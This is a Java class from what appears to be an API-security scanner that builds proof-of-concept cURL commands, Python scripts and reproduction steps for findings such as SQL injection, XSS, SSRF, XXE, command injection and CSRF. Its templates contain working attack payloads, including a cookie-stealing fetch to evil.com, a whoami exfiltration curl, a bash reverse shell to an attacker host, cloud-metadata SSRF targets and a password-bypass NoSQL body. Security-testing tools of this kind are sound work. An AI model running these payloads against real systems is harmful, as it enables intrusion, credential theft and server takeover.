package com.flechazo.apisentinel.poc;

import com.flechazo.apisentinel.logging.LeveledLogger;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * PoC（Proof of Concept）自动生成服务
 *
 * 根据已确认的漏洞发现自动生成可执行的验证方案，包括：
 * - cURL 命令（快速复现）
 * - Python 脚本（复杂漏洞自动化）
 * - 复现步骤（人类可读）
 * - 影响评估
 *
 * 支持 15+ 种漏洞类型的模板化 PoC 生成：
 * SQL Injection, XSS, BOLA/IDOR, SSRF, Path Traversal, SSTI, XXE,
 * Command Injection, Mass Assignment, Auth Bypass, CSRF, etc.
 *
 * 参考 Strix (usestrix/strix) 的 PoC 自动生成理念。
 *
 * @since 1.2.0
 */
public class PoCGeneratorService {

    private final LeveledLogger logger;

    public PoCGeneratorService(LeveledLogger logger) {
        this.logger = logger;
    }

    /**
     * 根据漏洞信息生成 PoC
     *
     * @param vulnType    漏洞类型（如 "SQL Injection"）
     * @param severity    严重性
     * @param endpoint    受影响端点（如 "GET /api/users/{id}"）
     * @param method      HTTP 方法
     * @param url         完整 URL（如 "https://example.com/api/users/1"）
     * @param payload     触发漏洞的 payload
     * @param evidence    漏洞证据（响应片段）
     * @param description 漏洞描述
     * @param remediation 修复建议
     * @param cookies     Cookie 字符串（可选，用于认证）
     * @param headers     额外请求头（可选）
     * @param confidence  置信度（0-100）
     * @return 生成的 PoC
     */
    public ProofOfConcept generate(String vulnType, String severity, String endpoint,
                                   String method, String url, String payload,
                                   String evidence, String description,
                                   String remediation, String cookies,
                                   String headers, int confidence) {
        if (vulnType == null || vulnType.isEmpty()) {
            vulnType = "Unknown";
        }

        return switch (normalizeType(vulnType)) {
            case "SQL_INJECTION" -> generateSqlInjectionPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "XSS" -> generateXssPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "BOLA", "IDOR" -> generateIdorPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "SSRF" -> generateSsrfPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "PATH_TRAVERSAL", "LFI" -> generatePathTraversalPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "SSTI" -> generateSstiPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "XXE" -> generateXxePoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "COMMAND_INJECTION", "RCE" -> generateCommandInjectionPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "MASS_ASSIGNMENT" -> generateMassAssignmentPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "AUTH_BYPASS", "BROKEN_AUTH" -> generateAuthBypassPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "CSRF" -> generateCsrfPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "OPEN_REDIRECT" -> generateOpenRedirectPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            case "NOSQL_INJECTION" -> generateNoSqlInjectionPoc(severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
            default -> generateGenericPoc(vulnType, severity, endpoint, method, url,
                    payload, evidence, description, remediation, cookies, headers, confidence);
        };
    }

    // ==================== SQL Injection PoC ====================

    private ProofOfConcept generateSqlInjectionPoc(String severity, String endpoint, String method,
                                                    String url, String payload, String evidence,
                                                    String description, String remediation,
                                                    String cookies, String headers, int confidence) {
        String title = "SQL Injection PoC — " + endpoint;
        String impact = "攻击者可通过 SQL 注入读取、修改或删除数据库中的任意数据。"
                + "在严重情况下，可通过 xp_cmdshell (MSSQL) 或 INTO OUTFILE (MySQL) 获取服务器 shell。"
                + "OWASP A03:2021 — Injection";

        String curl = buildCurl(method, url, payload, cookies, headers, "query_param");
        String python = buildPythonScript(method, url, payload, cookies, headers, "sql_injection");

        List<String> steps = List.of(
                "确认目标参数: " + extractParamName(url, payload),
                "发送正常请求作为基准: " + method + " " + url,
                "发送包含 SQL payload 的请求: " + truncate(payload, 80),
                "观察响应中是否包含数据库错误信息或异常数据",
                "对比正常响应和注入响应，确认数据差异",
                "如果成功，尝试提取数据库版本: ' UNION SELECT @@version--"
        );

        return new ProofOfConcept(
                "SQL Injection", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== XSS PoC ====================

    private ProofOfConcept generateXssPoc(String severity, String endpoint, String method,
                                           String url, String payload, String evidence,
                                           String description, String remediation,
                                           String cookies, String headers, int confidence) {
        String title = "Cross-Site Scripting (XSS) PoC — " + endpoint;
        String impact = "攻击者可注入恶意 JavaScript 代码，窃取用户 Cookie/Session，"
                + "劫持用户会话，执行任意操作（如转账、修改密码），"
                + "或重定向用户到钓鱼网站。OWASP A03:2021 — Injection";

        String curl = buildCurl(method, url, payload, cookies, headers, "query_param");
        String python = buildPythonScript(method, url, payload, cookies, headers, "xss");

        List<String> steps = List.of(
                "确认反射点: 参数 " + extractParamName(url, payload) + " 的值出现在响应中",
                "发送基础 payload: " + truncate(payload, 80),
                "在浏览器中访问构造的 URL（需登录态）",
                "如果 alert 弹窗出现，XSS 确认",
                "尝试 Cookie 窃取: <img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">",
                "注意: HttpOnly Cookie 无法通过 document.cookie 窃取"
        );

        return new ProofOfConcept(
                "XSS", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== IDOR/BOLA PoC ====================

    private ProofOfConcept generateIdorPoc(String severity, String endpoint, String method,
                                            String url, String payload, String evidence,
                                            String description, String remediation,
                                            String cookies, String headers, int confidence) {
        String title = "BOLA/IDOR PoC — " + endpoint;
        String impact = "攻击者可访问、修改或删除其他用户的资源（如订单、个人信息、文件），"
                + "导致大规模数据泄露。OWASP API Security Top 10 #1: BOLA";

        // For IDOR, generate two curl commands (user A and user B)
        String curl = "# 用户 A 的正常请求\n"
                + buildCurl(method, url, null, cookies, headers, null) + "\n\n"
                + "# 用户 B 访问用户 A 的资源（修改 ID）\n"
                + buildCurl(method, url.replace(extractLastId(url), "{{victim_resource_id}}"),
                null, "{{attacker_cookies}}", headers, null);

        String python = buildPythonScript(method, url, payload, cookies, headers, "idor");

        List<String> steps = List.of(
                "以用户 A 登录，访问自己的资源: " + method + " " + url,
                "记录响应中的用户标识字段（如 userId, accountId）",
                "以用户 B 登录（不同账号）",
                "使用用户 B 的 Cookie/Token，请求用户 A 的资源 ID",
                "如果返回用户 A 的数据（userId 匹配），IDOR 确认",
                "尝试修改/删除资源，验证写操作越权"
        );

        return new ProofOfConcept(
                "BOLA/IDOR", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== SSRF PoC ====================

    private ProofOfConcept generateSsrfPoc(String severity, String endpoint, String method,
                                            String url, String payload, String evidence,
                                            String description, String remediation,
                                            String cookies, String headers, int confidence) {
        String title = "Server-Side Request Forgery (SSRF) PoC — " + endpoint;
        String impact = "攻击者可利用服务器发起内部请求，访问内网服务（如 Redis、MySQL）、"
                + "云元数据服务（AWS/GCP/阿里云凭据泄露），或扫描内网端口。"
                + "OWASP API Security Top 10 #7: SSRF";

        String ssrfTargets = "http://169.254.169.254/latest/meta-data/ (AWS)\n"
                + "http://100.100.100.200/latest/meta-data/ (阿里云)\n"
                + "http://127.0.0.1:6379/ (Redis)\n"
                + "http://127.0.0.1:3306/ (MySQL)";

        String curl = buildCurl(method, url, payload, cookies, headers, "body_json");
        String python = buildPythonScript(method, url, payload, cookies, headers, "ssrf");

        List<String> steps = List.of(
                "确认存在 URL 参数或可控制的外部请求目标",
                "发送 SSRF payload 指向内网地址: " + truncate(payload, 60),
                "检查响应是否包含内网服务的数据",
                "尝试云元数据服务: http://169.254.169.254/latest/meta-data/",
                "如果成功获取 IAM 凭据，可进一步接管云资源",
                "尝试 SSRF 到内网 Redis: gopher://127.0.0.1:6379/_INFO"
        );

        return new ProofOfConcept(
                "SSRF", severity, title,
                description + "\n\n**可探测目标**:\n```\n" + ssrfTargets + "\n```",
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== Path Traversal PoC ====================

    private ProofOfConcept generatePathTraversalPoc(String severity, String endpoint, String method,
                                                     String url, String payload, String evidence,
                                                     String description, String remediation,
                                                     String cookies, String headers, int confidence) {
        String title = "Path Traversal PoC — " + endpoint;
        String impact = "攻击者可读取服务器上的任意文件，包括配置文件、源代码、"
                + "/etc/passwd、/etc/shadow、应用配置（含数据库密码）等。"
                + "OWASP A01:2021 — Broken Access Control";

        String curl = buildCurl(method, url, payload, cookies, headers, "query_param");
        String python = buildPythonScript(method, url, payload, cookies, headers, "path_traversal");

        List<String> steps = List.of(
                "确认存在文件路径参数: " + extractParamName(url, payload),
                "发送路径穿越 payload: " + truncate(payload, 60),
                "检查响应是否包含 /etc/passwd 的内容",
                "尝试读取应用配置: ../../../application.yml",
                "尝试读取源代码: ../../../src/main/java/...",
                "如果 base64 编码被过滤，尝试双重 URL 编码: %252e%252e%252f"
        );

        return new ProofOfConcept(
                "Path Traversal", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== SSTI PoC ====================

    private ProofOfConcept generateSstiPoc(String severity, String endpoint, String method,
                                            String url, String payload, String evidence,
                                            String description, String remediation,
                                            String cookies, String headers, int confidence) {
        String title = "Server-Side Template Injection (SSTI) PoC — " + endpoint;
        String impact = "攻击者可在模板引擎中执行任意代码，导致远程代码执行（RCE）。"
                + "可完全控制服务器，窃取所有数据。";

        String curl = buildCurl(method, url, payload, cookies, headers, "body_json");
        String python = buildPythonScript(method, url, payload, cookies, headers, "ssti");

        List<String> steps = List.of(
                "确认模板表达式被计算: {{7*7}} → 49",
                "识别模板引擎: Jinja2 (Python) / Thymeleaf (Java) / Twig (PHP)",
                "发送探测 payload: " + truncate(payload, 60),
                "如果响应包含命令执行结果，RCE 确认",
                "尝试读取文件: {{''.__class__.__mro__[2].__subclasses__()}}",
                "建立反向 shell 获取完整控制"
        );

        return new ProofOfConcept(
                "SSTI", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== XXE PoC ====================

    private ProofOfConcept generateXxePoc(String severity, String endpoint, String method,
                                           String url, String payload, String evidence,
                                           String description, String remediation,
                                           String cookies, String headers, int confidence) {
        String title = "XML External Entity (XXE) PoC — " + endpoint;
        String impact = "攻击者可通过 XML 解析器读取服务器文件、发起 SSRF 请求、"
                + "或在某些情况下执行远程代码。";

        String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                + "]>\n"
                + "<root>&xxe;</root>";

        String curl = "curl -X " + escapeSingle(method) + " '" + escapeSingle(url) + "' \\\n"
                + "  -H 'Content-Type: application/xml' \\\n"
                + (cookies != null ? "  -H 'Cookie: " + escapeSingle(cookies) + "' \\\n" : "")
                + "  -d '" + xxePayload.replace("'", "'\\''") + "'";

        String python = buildPythonScript(method, url, xxePayload, cookies, headers, "xxe");

        List<String> steps = List.of(
                "确认端点接受 XML 输入（Content-Type: application/xml）",
                "发送包含外部实体的 XML payload",
                "检查响应是否包含 /etc/passwd 的内容",
                "尝试 SSRF: <!ENTITY xxe SYSTEM \"http://169.254.169.254/\">",
                "尝试参数实体（带外数据泄露）",
                "如果 Java 环境，尝试 jar: 协议读取 classpath 资源"
        );

        return new ProofOfConcept(
                "XXE", severity, title, description,
                curl, python, steps, impact,
                endpoint, xxePayload, evidence, remediation, confidence
        );
    }

    // ==================== Command Injection PoC ====================

    private ProofOfConcept generateCommandInjectionPoc(String severity, String endpoint, String method,
                                                        String url, String payload, String evidence,
                                                        String description, String remediation,
                                                        String cookies, String headers, int confidence) {
        String title = "Command Injection (RCE) PoC — " + endpoint;
        String impact = "攻击者可在服务器上执行任意操作系统命令，获取完整服务器控制权。"
                + "这是最严重的漏洞类型之一。";

        String curl = buildCurl(method, url, payload, cookies, headers, "body_json");
        String python = buildPythonScript(method, url, payload, cookies, headers, "command_injection");

        List<String> steps = List.of(
                "确认命令执行: ; id 或 | whoami",
                "发送 payload: " + truncate(payload, 60),
                "检查响应中是否包含命令输出（如 uid=, root, NT AUTHORITY）",
                "尝试带外数据泄露: ; curl https://evil.com/?x=$(whoami)",
                "尝试反向 shell: ; bash -i >& /dev/tcp/attacker/4444 0>&1",
                "升级权限并持久化访问"
        );

        return new ProofOfConcept(
                "Command Injection", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== Mass Assignment PoC ====================

    private ProofOfConcept generateMassAssignmentPoc(String severity, String endpoint, String method,
                                                      String url, String payload, String evidence,
                                                      String description, String remediation,
                                                      String cookies, String headers, int confidence) {
        String title = "Mass Assignment PoC — " + endpoint;
        String impact = "攻击者可通过提交额外字段修改不该被修改的对象属性，"
                + "如提升权限（isAdmin=true）、修改余额、绕过验证等。"
                + "OWASP API Security Top 10 #3: BOPLA";

        String massPayload = "{\n"
                + "  \"name\": \"normal_update\",\n"
                + "  \"isAdmin\": true,        // 尝试提权\n"
                + "  \"role\": \"admin\",        // 尝试角色篡改\n"
                + "  \"balance\": 999999,       // 尝试金额篡改\n"
                + "  \"verified\": true         // 尝试绕过验证\n"
                + "}";

        String curl = "curl -X " + escapeSingle(method) + " '" + escapeSingle(url) + "' \\\n"
                + "  -H 'Content-Type: application/json' \\\n"
                + (cookies != null ? "  -H 'Cookie: " + escapeSingle(cookies) + "' \\\n" : "")
                + "  -d '" + massPayload.replace("'", "'\\''") + "'";

        String python = buildPythonScript(method, url, massPayload, cookies, headers, "mass_assignment");

        List<String> steps = List.of(
                "识别 API 接受的字段（通过正常请求观察响应）",
                "提交包含额外字段的请求: isAdmin, role, balance 等",
                "检查响应是否接受了额外字段（返回 200 且字段被更新）",
                "重新 GET 资源，验证字段是否被持久化",
                "如果 isAdmin=true 生效，尝试访问管理端点验证权限提升",
                "检查是否有其他隐藏字段可被篡改"
        );

        return new ProofOfConcept(
                "Mass Assignment", severity, title, description,
                curl, python, steps, impact,
                endpoint, massPayload, evidence, remediation, confidence
        );
    }

    // ==================== Auth Bypass PoC ====================

    private ProofOfConcept generateAuthBypassPoc(String severity, String endpoint, String method,
                                                  String url, String payload, String evidence,
                                                  String description, String remediation,
                                                  String cookies, String headers, int confidence) {
        String title = "Authentication Bypass PoC — " + endpoint;
        String impact = "攻击者可绕过认证机制访问受保护的资源，"
                + "可能导致未授权数据访问或管理功能滥用。";

        String curl = "# 不带认证凭据的请求\n"
                + buildCurl(method, url, null, null, headers, null) + "\n\n"
                + "# 使用空/伪造 Token\n"
                + buildCurl(method, url, null, "token=invalid", headers, null);

        String python = buildPythonScript(method, url, payload, cookies, headers, "auth_bypass");

        List<String> steps = List.of(
                "发送不带任何认证凭据的请求",
                "如果返回 200（而非 401/403），认证缺失",
                "尝试空 Token: Authorization: Bearer ",
                "尝试已过期/已撤销的 Token",
                "尝试 JWT 算法切换: RS256 → none",
                "检查是否有默认凭据（admin/admin, root/root）"
        );

        return new ProofOfConcept(
                "Authentication Bypass", severity, title, description,
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== CSRF PoC ====================

    private ProofOfConcept generateCsrfPoc(String severity, String endpoint, String method,
                                            String url, String payload, String evidence,
                                            String description, String remediation,
                                            String cookies, String headers, int confidence) {
        String title = "Cross-Site Request Forgery (CSRF) PoC — " + endpoint;
        String impact = "攻击者可诱导已登录用户在不知情的情况下执行状态变更操作，"
                + "如转账、修改密码、删除数据等。";

        String csrfHtml = "<!-- CSRF PoC — 保存为 .html 文件，诱导已登录用户访问 -->\n"
                + "<html>\n<body>\n"
                + "<h1>Click here for a prize!</h1>\n"
                + "<form id=\"csrf\" action=\"" + escapeHtml(url) + "\" method=\"" + escapeHtml(method) + "\">\n"
                + "  <input type=\"hidden\" name=\"param\" value=\"malicious_value\">\n"
                + "</form>\n"
                + "<script>document.getElementById('csrf').submit();</script>\n"
                + "</body>\n</html>";

        String curl = "# CSRF 测试: 不带 CSRF Token 发送请求\n"
                + buildCurl(method, url, payload, cookies, headers, "form");

        List<String> steps = List.of(
                "确认目标操作使用 Cookie 认证（非 Token）",
                "发送请求但不带 CSRF Token",
                "如果操作成功执行，CSRF 漏洞确认",
                "构造 HTML 表单页面（如上）",
                "诱导已登录用户访问该页面",
                "验证用户会话中是否执行了非预期操作"
        );

        return new ProofOfConcept(
                "CSRF", severity, title, description,
                curl, csrfHtml, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== Open Redirect PoC ====================

    private ProofOfConcept generateOpenRedirectPoc(String severity, String endpoint, String method,
                                                    String url, String payload, String evidence,
                                                    String description, String remediation,
                                                    String cookies, String headers, int confidence) {
        String title = "Open Redirect PoC — " + endpoint;
        String impact = "攻击者可构造恶意链接将用户重定向到钓鱼网站，"
                + "利用用户对目标域名的信任窃取凭据。";

        String redirectUrl = url + (url.contains("?") ? "&" : "?") + "redirect=https://evil.com/phishing";
        String curl = "curl -v '" + escapeSingle(redirectUrl) + "'";

        List<String> steps = List.of(
                "确认存在重定向参数: redirect, next, url, return, callback",
                "设置参数值为外部 URL: https://evil.com",
                "检查响应是否为 3xx 且 Location 头指向外部 URL",
                "构造钓鱼链接: " + redirectUrl,
                "尝试绕过: //evil.com, /\\evil.com, https://legit.com@evil.com",
                "验证用户浏览器是否被重定向到外部站点"
        );

        return new ProofOfConcept(
                "Open Redirect", severity, title, description,
                curl, null, steps, impact,
                endpoint, redirectUrl, evidence, remediation, confidence
        );
    }

    // ==================== NoSQL Injection PoC ====================

    private ProofOfConcept generateNoSqlInjectionPoc(String severity, String endpoint, String method,
                                                      String url, String payload, String evidence,
                                                      String description, String remediation,
                                                      String cookies, String headers, int confidence) {
        String title = "NoSQL Injection PoC — " + endpoint;
        String impact = "攻击者可通过注入 MongoDB 操作符绕过认证、"
                + "提取数据或操纵查询逻辑。";

        String nosqlPayload = "{\n"
                + "  \"username\": \"admin\",\n"
                + "  \"password\": {\"$ne\": \"\"}  // 绕过密码验证\n"
                + "}";

        String curl = "curl -X " + escapeSingle(method) + " '" + escapeSingle(url) + "' \\\n"
                + "  -H 'Content-Type: application/json' \\\n"
                + (cookies != null ? "  -H 'Cookie: " + escapeSingle(cookies) + "' \\\n" : "")
                + "  -d '" + nosqlPayload.replace("'", "'\\''") + "'";

        String python = buildPythonScript(method, url, nosqlPayload, cookies, headers, "nosql_injection");

        List<String> steps = List.of(
                "确认 API 使用 MongoDB（响应特征或错误信息）",
                "在登录接口注入 $ne 操作符: {\"$ne\": \"\"}",
                "如果成功登录，认证绕过确认",
                "尝试 $gt 操作符: {\"$gt\": \"\"}",
                "尝试 $regex 操作符进行数据枚举",
                "尝试 $where 操作符执行 JavaScript 代码"
        );

        return new ProofOfConcept(
                "NoSQL Injection", severity, title, description,
                curl, python, steps, impact,
                endpoint, nosqlPayload, evidence, remediation, confidence
        );
    }

    // ==================== Generic PoC ====================

    private ProofOfConcept generateGenericPoc(String vulnType, String severity, String endpoint,
                                               String method, String url, String payload,
                                               String evidence, String description,
                                               String remediation, String cookies,
                                               String headers, int confidence) {
        String title = vulnType + " PoC — " + endpoint;
        String impact = "该漏洞可能导致数据泄露、未授权访问或其他安全风险。";

        String curl = buildCurl(method, url, payload, cookies, headers, null);
        String python = buildPythonScript(method, url, payload, cookies, headers, "generic");

        List<String> steps = List.of(
                "发送请求: " + method + " " + url,
                "使用 payload: " + truncate(payload != null ? payload : "(none)", 80),
                "观察响应异常或数据泄露",
                "记录证据并截图",
                "评估影响范围",
                "报告给安全团队"
        );

        return new ProofOfConcept(
                vulnType, severity, title,
                description != null ? description : "检测到 " + vulnType + " 漏洞",
                curl, python, steps, impact,
                endpoint, payload, evidence, remediation, confidence
        );
    }

    // ==================== Builder Helpers ====================

    private String buildCurl(String method, String url, String payload,
                              String cookies, String headers, String payloadMode) {
        StringBuilder sb = new StringBuilder();
        sb.append("curl -X ").append(method != null ? method : "GET");
        sb.append(" '").append(escapeSingle(url != null ? url : "https://target/api/endpoint")).append("'");

        if (payload != null && !payload.isEmpty()) {
            if ("body_json".equals(payloadMode)) {
                sb.append(" \\\n  -H 'Content-Type: application/json'");
                sb.append(" \\\n  -d '").append(payload.replace("'", "'\\''")).append("'");
            } else if ("form".equals(payloadMode)) {
                sb.append(" \\\n  -H 'Content-Type: application/x-www-form-urlencoded'");
                sb.append(" \\\n  -d '").append(payload.replace("'", "'\\''")).append("'");
            } else if ("query_param".equals(payloadMode)) {
                // Payload is already in the URL or needs to be added
                if (payload.contains("=") || url == null || !url.contains("?")) {
                    sb.append(" # payload: ").append(singleLine(payload));
                }
            } else if (method != null && !method.equalsIgnoreCase("GET")) {
                sb.append(" \\\n  -H 'Content-Type: application/json'");
                sb.append(" \\\n  -d '").append(payload.replace("'", "'\\''")).append("'");
            }
        }

        if (cookies != null && !cookies.isEmpty()) {
            sb.append(" \\\n  -H 'Cookie: ").append(escapeSingle(cookies)).append("'");
        }
        if (headers != null && !headers.isEmpty()) {
            for (String header : headers.split("\n")) {
                if (!header.isBlank()) {
                    sb.append(" \\\n  -H '").append(escapeSingle(header.trim())).append("'");
                }
            }
        }

        return sb.toString();
    }

    private String buildPythonScript(String method, String url, String payload,
                                      String cookies, String headers, String vulnType) {
        StringBuilder sb = new StringBuilder();
        sb.append("#!/usr/bin/env python3\n");
        sb.append("\"\"\"PoC for ").append(escapePy(vulnType)).append(" — Auto-generated by API Sentinel\"\"\"\n\n");
        sb.append("import json\nimport requests\nimport sys\n\n");

        sb.append("TARGET = \"").append(escapePy(url != null ? url : "https://target/api/endpoint")).append("\"\n");

        if (cookies != null && !cookies.isEmpty()) {
            sb.append("COOKIES = {\n");
            for (String pair : cookies.split(";")) {
                String[] kv = pair.trim().split("=", 2);
                if (kv.length == 2) {
                    sb.append("    \"").append(escapePy(kv[0].trim())).append("\": \"").append(escapePy(kv[1].trim())).append("\",\n");
                }
            }
            sb.append("}\n");
        } else {
            sb.append("COOKIES = {}\n");
        }

        sb.append("HEADERS = {\"User-Agent\": \"API-Sentinel-PoC/1.0\"}\n\n");

        sb.append("def exploit():\n");
        sb.append("    try:\n");

        if (method == null || method.equalsIgnoreCase("GET")) {
            sb.append("        resp = requests.get(TARGET, cookies=COOKIES, headers=HEADERS, timeout=10)\n");
        } else if (method.equalsIgnoreCase("POST")) {
            if (payload != null && payload.startsWith("{")) {
                // P1 安全加固：原先是 `data = <payload>` 直接把用户 payload 当 Python 代码拼，
                // payload 内含 `}; import os; os.system(...)` 即可注入。改为 json.loads 解析转义后的字符串字面量。
                sb.append("        data = json.loads(\"").append(escapePy(payload)).append("\")\n");
                sb.append("        HEADERS[\"Content-Type\"] = \"application/json\"\n");
                sb.append("        resp = requests.post(TARGET, json=data, cookies=COOKIES, headers=HEADERS, timeout=10)\n");
            } else {
                sb.append("        data = \"").append(escapePy(payload)).append("\"\n");
                sb.append("        resp = requests.post(TARGET, data=data, cookies=COOKIES, headers=HEADERS, timeout=10)\n");
            }
        } else if (method.equalsIgnoreCase("PUT") || method.equalsIgnoreCase("PATCH")) {
            if (payload != null && payload.startsWith("{")) {
                sb.append("        data = json.loads(\"").append(escapePy(payload)).append("\")\n");
            } else {
                sb.append("        data = \"").append(escapePy(payload)).append("\"\n");
            }
            sb.append("        resp = requests.").append(method.toLowerCase())
                    .append("(TARGET, json=data, cookies=COOKIES, headers=HEADERS, timeout=10)\n");
        } else if (method.equalsIgnoreCase("DELETE")) {
            sb.append("        resp = requests.delete(TARGET, cookies=COOKIES, headers=HEADERS, timeout=10)\n");
        } else {
            sb.append("        resp = requests.request(\"").append(escapePy(method))
                    .append("\", TARGET, cookies=COOKIES, headers=HEADERS, timeout=10)\n");
        }

        sb.append("        print(f\"Status: {resp.status_code}\")\n");
        sb.append("        print(f\"Response ({len(resp.text)} chars):\")\n");
        sb.append("        print(resp.text[:1000])\n");
        sb.append("        return resp\n");
        sb.append("    except Exception as e:\n");
        sb.append("        print(f\"Error: {e}\")\n");
        sb.append("        return None\n\n");

        sb.append("if __name__ == \"__main__\":\n");
        sb.append("    print(f\"[*] Testing {TARGET}\")\n");
        sb.append("    result = exploit()\n");
        sb.append("    if result and result.status_code < 400:\n");
        sb.append("        print(\"[+] Potential vulnerability detected!\")\n");
        sb.append("    else:\n");
        sb.append("        print(\"[-] Check manually or adjust parameters\")\n");

        return sb.toString();
    }

    // ==================== Utility Methods ====================

    /**
     * P1 安全加固：POSIX shell 单引号转义。
     * 在 curl 命令中以单引号包裹的值（url / cookies / headers / payload）若含嵌入的
     * 单引号，可提前闭合引号实现命令注入（如 {@code https://x';rm -rf /}）。
     * 标准做法：把 {@code '} 替换为 {@code '\\''}（结束当前引号、转义单引号、重开引号）。
     */
    static String escapeSingle(String s) {
        if (s == null) return "";
        return s.replace("'", "'\\''");
    }

    /**
     * P1 安全加固：Python 双引号字符串转义。
     * 在生成的 Python 脚本中以 {@code "..."} 包裹的值（url / cookie / method / vulnType）
     * 若含 {@code "} 或 {@code \}，可闭合字符串注入 Python 代码。先转义反斜杠再转义双引号。
     */
    static String escapePy(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    /** 单行化（shell 注释等不可跨行场景），把所有换行符替换为空格，防止截断注释后注入命令。 */
    static String singleLine(String s) {
        if (s == null) return "";
        return s.replace("\r\n", " ").replace("\r", " ").replace("\n", " ");
    }

    /** P1 安全加固：HTML 属性转义，防止 url/method 含 {@code "} 破坏 CSRF PoC 的 action 属性。 */
    static String escapeHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#39;");
    }

    /** Normalize vulnerability type to a standard key */
    private String normalizeType(String type) {
        if (type == null) return "UNKNOWN";
        String upper = type.toUpperCase()
                .replace(" ", "_")
                .replace("-", "_")
                .replace("/", "_");
        // Common aliases
        if (upper.contains("SQL") && upper.contains("INJECT")) return "SQL_INJECTION";
        if (upper.contains("XSS") || upper.contains("CROSS_SITE_SCRIPT")) return "XSS";
        if (upper.contains("IDOR") || upper.contains("BOLA") || upper.contains("OBJECT_LEVEL")) return "BOLA";
        if (upper.contains("SSRF") || upper.contains("SERVER_SIDE_REQUEST")) return "SSRF";
        if (upper.contains("TRAVERSAL") || upper.contains("LFI") || upper.contains("DIRECTORY")) return "PATH_TRAVERSAL";
        if (upper.contains("SSTI") || upper.contains("TEMPLATE_INJECT")) return "SSTI";
        if (upper.contains("XXE") || upper.contains("XML_EXTERNAL")) return "XXE";
        if (upper.contains("COMMAND") || upper.contains("RCE") || upper.contains("REMOTE_CODE")) return "COMMAND_INJECTION";
        if (upper.contains("MASS_ASSIGN") || upper.contains("BOPLA")) return "MASS_ASSIGNMENT";
        if (upper.contains("AUTH") && upper.contains("BYPASS")) return "AUTH_BYPASS";
        if (upper.contains("BROKEN") && upper.contains("AUTH")) return "BROKEN_AUTH";
        if (upper.contains("CSRF") || upper.contains("CROSS_SITE_REQUEST")) return "CSRF";
        if (upper.contains("REDIRECT")) return "OPEN_REDIRECT";
        if (upper.contains("NOSQL")) return "NOSQL_INJECTION";
        return upper;
    }

    /** Extract the parameter name from URL or payload context */
    private String extractParamName(String url, String payload) {
        if (url != null && url.contains("?")) {
            String query = url.substring(url.indexOf('?') + 1);
            String[] pairs = query.split("&");
            if (pairs.length > 0) {
                String first = pairs[0];
                int eq = first.indexOf('=');
                if (eq > 0) return first.substring(0, eq);
            }
        }
        return "(parameter)";
    }

    /** Extract the last numeric/UUID ID from a URL path */
    private String extractLastId(String url) {
        if (url == null) return "";
        Matcher m = Pattern.compile("([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}|\\d+)").matcher(url);
        String lastId = "";
        while (m.find()) lastId = m.group();
        return lastId;
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }
}
